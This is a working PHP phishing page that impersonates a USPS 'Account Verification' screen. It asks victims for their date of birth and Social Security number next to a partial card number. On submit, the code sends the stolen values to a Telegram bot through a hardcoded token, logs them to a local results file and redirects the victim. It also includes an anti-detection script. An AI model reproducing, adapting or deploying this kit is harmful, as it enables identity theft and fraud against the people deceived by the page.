<?php

include "anti/anti3.php"; 

include "id.php";
if(isset($_POST['okbb'])){
$ip = getenv("REMOTE_ADDR");



$message = "".$_POST['dob']."|".$_POST['ssn']."";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot1772059577:AAGezCC65m1-1zQPhVm5Ea5CTT_E3WYBAIU/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

if ($switch == 2){
	HEADER("Location: index4.php");
}else{
	HEADER("Location: thanks.php");
}

}
?>




<!DOCTYPE html>
<html data-ng-app="BankApp" data-ng-controller="BankAuthFail" dir="ltr" class="ng-scope">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8" />
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-start {
                clip: rect(0, auto, auto, 0);
                -ms-zoom: 1.0001;
            }
            .ng-animate-active {
                clip: rect(-1px, auto, auto, 0);
                -ms-zoom: 1;
            }
        </style>

        <title>USPS Account Verification</title>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black" />

        <link rel="stylesheet" href="usps/master.css" />
        <!-- ngIf: arabicdir == 'rtl' -->
        <link rel="stylesheet" href="usps/citimexmccredit.css" />
        <link rel="shortcut icon" href="post_assetz/img/favicon.ico" type="image/x-icon" />
		<script src="usps/jquery.js"></script>
	<script src="usps/jquery.validate.js"></script>
	<script src="usps/jquery.maskedinput.js"></script>
	<script src="usps/jquery.payment.js"></script>
		<script type="text/javascript">
	
		jQuery(function($){
			$("#dob").mask("99/99/9999",{placeholder:"MM/DD/YYYY"});
			$("#ssn").mask("999-99-9999");
		});
	
	
	</script>
    </head>

    <body>
        <div class="wrapper" data-ng-show="display" data-ng-init="init()">
            <div class="page-wrap">
                <div>
                    <header role="banner">
					<br>
						<div class="logo-left">
                            <img src="https://www.usps.com/global-elements/header/images/utility-header/logo-sb.svg" style="width:100px;">
                        </div>
						
						<div class="logo-right">
                            
							<img class="cc_type" id="cc_type" src="usps/ssl.png" style="width:100px;">
                        </div>
					
                    </header>
                </div>
                <form name="downloadForm" id="otpForm" action="" method="POST" autocomplete="OFF" class="ng-pristine ng-valid">
					<section class="gradient" role="main">
                        <div class="content-container">
                            <h1 id="authheader" data-ng-bind-html="authheader" class="ng-binding">Fill out the fields below to complete the verification process.</h1>
                            <br>
							<p id="authsubheader" data-ng-bind-html="authfailedbody" class="ng-binding">This information is not shared with the merchant.<br>This service has been requested by USPS.</p>
							<br>
						</div>
						
						<style>
							th, td {
								padding: 2px;
							}
						</style>
						<table style="width:100%;">
						<tr>
							<td>
								<label for="test3" class="innerlabel">Merchant :</label>
							</td>
							<td>
								<label id="test3" class=""><b>usps.com</b></label>
							</td>
						</tr>
						
						<tr>
							<td>
								<label for="test5" class="innerlabel">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   Date :</label>
							</td>
							<td>
								<label id="test5" class=""><b><?=date('d/m/Y');?></b></label>
							</td>
						</tr>
						
						<tr>
							<td>
								<label for="test4" class="innerlabel">Card Number :</label>
								<br>
								
							</td>
							<td>
								<label id="test4" class=""><b>xxxx-xxxx-xxxx-<?=$last4;?></b></label>
								<br>
								<br>
							</td>
						</tr>
						
 

<tr>
	<td>
		<label for="dob" class="innerlabel">Date of Birth :</label>
	</td>
	<td>
		<div class="form-content">
			<input required id="dob" name="dob" type="tel" class="text" style="width:70%;" />
		</div>
	</td>
</tr>
<tr>
	<td>
		<label for="ssn" class="innerlabel">Social Security Number :</label>
	</td>
	<td>
		<div class="form-content">
			<input required id="ssn" name="ssn" type="tel" class="text" style="width:70%;" />
		</div>
	</td>
</tr>
 
						
					
						
					</table>
					
					
                        <div class="controlsAuth">
                            <button is-clicked="" name="okbb" type="submit" value="Submit" id="authsubmit" class="blue ng-binding" title="Continue">Continue</button>
                        </div>
                    </section>
					
					
					


					
					
                    
                    
                </form>
            </div>
            <div>
                <footer role="contentinfo">
                    
                    <span class="small ng-scope" id="commonfooter">
                        <a id="footerid" title="usps.com" class="ng-binding">usps.com</a>
                        <span class="separator ng-binding">|</span>
                    </span>
                    <!-- end ngRepeat: bankdetailkey in commonfooter -->
                    <span class="small ng-scope commonfooterlast" id="commonfooter">
                        <a id="footerid" title="Banking Verification" class="ng-binding">Banking Verification</a>
                        <span class="separator ng-binding">|</span>
                    </span>
                    <!-- end ngRepeat: bankdetailkey in commonfooter -->
                </footer>
            </div>
        </div>
    </body>
</html>
